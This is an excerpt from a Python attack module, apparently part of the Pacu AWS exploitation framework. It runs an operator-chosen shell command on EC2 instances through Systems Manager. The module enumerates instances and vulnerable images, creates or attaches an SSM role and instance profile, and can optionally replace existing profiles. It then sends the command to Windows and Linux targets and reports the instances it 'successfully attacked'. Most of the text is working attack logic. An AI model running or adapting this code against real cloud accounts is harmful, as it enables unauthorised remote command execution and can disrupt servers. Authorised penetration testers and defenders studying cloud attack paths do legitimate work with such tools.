...
parser.add_argument(
    ...
    required=True,
    default=None,
    help="The shell command to run on the targeted EC2 instances",
)
parser.add_argument(
    "--target-os",
    required=False,
    default="All",
    help="This argument is what operating systems to target. Valid options are: Windows, Linux, or All. The default is All",
)
parser.add_argument(
    "--all-instances",
    required=False,
    default=False,
    action="store_true",
    help="Skip vulnerable operating system check and just target every instance",
)
parser.add_argument(
    "--target-instances",
    required=False,
    default=None,
    help="A comma-separated list of instances and regions to set as the attack targets in the format of instance-id@region,instance2-id@region...",
)
parser.add_argument(
    "--replace",
    required=False,
    default=False,
    action="store_true",
    help="For EC2 instances that already have an instance profile attached to them, this argument will replace those with the Systems Manager instance profile. WARNING: This can cause bad things to happen! You never know what negative side effects this may have on a server without further inspection, because you do not know what permissions you are removing/replacing that the instance already had",
)
parser.add_argument(
    "--ip-name",
    required=False,
    default=None,
    help='The name of an existing instance profile with an "EC2 Role for Simple Systems Manager" attached to it. This will skip the automatic role/instance profile enumeration and the searching for a Systems Manager role/instance profile',
)
...
def main(args, pacu_main):
    ...
    if not (
        args.target_os.lower() == "all"
        or args.target_os.lower() == "windows"
        or args.target_os.lower() == "linux"
    ):
        print(
            "Invalid option specified for the --target-os argument. Valid options include: All, Windows, or Linux. If --target-os is not specified, the default is All.\n"
        )
        return
    ...
    if args.all_instances is True and args.target_instances is not None:
        print(
            "Invalid arguments received. Expecting one or zero of --all-instances and --target-instances, received both.\n"
        )
        return

    if (
        args.target_instances is None
    ):  # If --target-instances is not specified, then we need to enumerate instances
        if (
            fetch_data(
                ["EC2", "Instances"],
    ...
    if args.all_instances is False and args.target_instances is None:
        ...
        for region in regions:
            ...
            if image_ids == []:
                ...
                try:
                    images = client.describe_images(ImageIds=list(set(image_ids)))[
                        "Images"
                    ]
                    ...
                    if code == "UnauthorizedOperation":
                        ...
                        print("  " + code)
                    print(
                        "Consider manual operating system enumeration techniques and pass them to the --target-instances argument."
                    )
                    return None
                ...
                for image in images:
                    os_details = "{} {} {}".format(
                        image["Description"], image["ImageLocation"], image["Name"]
                    )
    ...
    if ssm_instance_profile_name == "":
        ...
        if ssm_policy["AttachmentCount"] > 0:
            if (
                fetch_data(
                    ["IAM", "Roles"], module_info["prerequisite_modules"][1], "--roles"
                )
                is False
            ):
                print("Pre-req module not run successfully. Exiting...\n")
        ...
        if ssm_role_name == "":
            print(
                "Did not find valid EC2 SystemsManager service role (which means there is no instance profile either). Trying to create one now...\n"
            )
            try:
                # Create the SSM role
                ...
                print(
                    "  Successfully created the required role: {}\n".format(
                        create_response["Arn"]
                    )
                )
            ...
            print(
                "Found valid SystemsManager service role: {}. Checking if it is associated with an instance profile...\n".format(
                    ssm_role_name
                )
            )
            ...
            response = client.list_instance_profiles_for_role(
                RoleName=ssm_role_name, MaxItems=1
            )

            if len(response["InstanceProfiles"]) > 0:
                ssm_instance_profile_name = response["InstanceProfiles"][0][
                    "InstanceProfileName"
                ]
                ssm_instance_profile_arn = response["InstanceProfiles"][0]["Arn"]
                ssm_instance_profile_id = response["InstanceProfiles"][0][
                    "InstanceProfileId"
                ]
                print(
                    "Found valid instance profile: {}.\n".format(
                        ssm_instance_profile_name
                    )
                )
        ...
        if ssm_instance_profile_name == "":
            ...
            try:
                ...
                response = client.create_instance_profile(InstanceProfileName="SSM")[
                    "InstanceProfile"
                ]
    ...
    for region in regions:
        ...
        for instance in instances:
            if (
                ...
                if instance["Region"] == region:
                    if (
                        args.target_instances is not None
                        or args.all_instances is True
                        or instance["ImageId"] in vuln_images
                    ):
                        if "IamInstanceProfile" in instance:
                            ...
                            if (
                                ...
                                print(
                                    "  Instance ID {} already has a Systems Manager instance profile attached to it. Adding to target list...\n".format(
                                        instance["InstanceId"]
                                    )
                                )
                                ...
                                if args.target_instances is not None:
                                    print(
                                        "  Instance ID {} already has an instance profile attached to it, will try to attack anyways...".format(
                                            instance["InstanceId"]
                                        )
                                    )
                                    targeted_instances.append(instance["InstanceId"])
                                    ...
                                    print(
                                        "  Instance ID {} already has an instance profile attached to it, skipping...".format(
                                            instance["InstanceId"]
                                        )
                                    )
                                pass
                            ...
                            for instance_in_db in ec2_data["Instances"]:
                                ...
                                if (
                                    ...
                                    instance_in_db["IamInstanceProfile"][
                                        "Id"
                                    ] = ssm_instance_profile_id
                                    break
                            print(
                                "  Instance profile attached to instance ID {}.".format(
                                    instance["InstanceId"]
                                )
                            )
        if len(instances_to_replace) > 0 and replace is True:
            ...
            response = client.describe_iam_instance_profile_associations(
                Filters=[{"Name": "instance-id", "Values": instances_to_replace}]
            )
                ...
                try:
                    ...
                    for instance_in_db in ec2_data["Instances"]:
                        if instance_in_db["InstanceId"] == instance["InstanceId"]:
                            ...
                            break
                    print(
                        "  Instance profile replaced for instance ID {}.".format(
                            instance_id
                        )
                    )
                except Exception as error:
                    print(
                        "  Failed to run replace_iam_instance_profile_association on instance ID {}: {}\n".format(
                            instance_id, str(error)
                        )
                    )
                    replace = input(
                        "Do you want to keep trying to replace instance profiles, or skip the rest based on the error shown? (y/n) "
                    )
                    if replace == "y":
                        replace = True
                    else:
    ...
    for i in range(1, 21):
        ...
        for region in regions:
            ...
            try:
                ...
                for instance in response["InstanceInformationList"]:
                    discovered_instances.append(
                        [instance["InstanceId"], instance.get("PlatformType", None)]
                    )
                while "NextToken" in response:
                    response = client.describe_instance_information(
                        NextToken=response["NextToken"]
                ...
                print(
                    "  Access denied to DescribeInstanceInformation in region {}.\n".format(
                        region
                    )
                )
                continue
            ...
            for instance in discovered_instances:
                ...
                if (
                    instance[0] not in attacked_instances
                    and instance[0] not in ignored_instances
                ):
                    if (
                        args.target_os.lower() == "all"
                        or instance[1].lower() == args.target_os.lower()
                    ):
                        ...
                        if instance[0] not in targeted_instances:
                            if ignore_all:
                                ...
                                continue
                            action = input(
                                "  Instance ID {} (Platform: {}) was not found in the list of targeted instances, but it might be possible to attack it, do you want to try and attack this instance (a) or ignore it (i) or ignore all (I)? (a/i/I) ".format(
                            ...
                            if action == "I":
                                ...
                                print(
                                    "  Adding instance ID {} to list of targets.\n".format(
                                        instance[0]
                                    )
                                )
                        ...
                        if instance[1].lower() == "windows":
                            ...
                            print(
                                "  Unknown operating system for instance ID {}: {}. Not attacking it...\n".format(
                                    instance[0], instance[1]
                                )
                            )
            ...
            # Windows
            if len(windows_instances_to_attack) > 0 and (
                args.target_os.lower() == "all" or args.target_os.lower() == "windows"
            ):
            ...
            # Linux
            if len(linux_instances_to_attack) > 0 and (
                args.target_os.lower() == "all" or args.target_os.lower() == "linux"
            ):
                params = {"commands": [args.command]}
                response = client.send_command(
        ...
        print(
            "  {} new instances attacked in the latest check: {}\n".format(
                len(this_check_attacked_instances), this_check_attacked_instances
            )
        )
    ...
    if i == 20:
        ...
        print(
            "It has been 10 minutes, if any target instances were not successfully attacked, then that most likely means they are not vulnerable to this attack (most likely the SSM Agent is not installed on the instances).\n"
        )
        print(
            "Successfully attacked the following instances: {}\n".format(
                attacked_instances
            )
        )
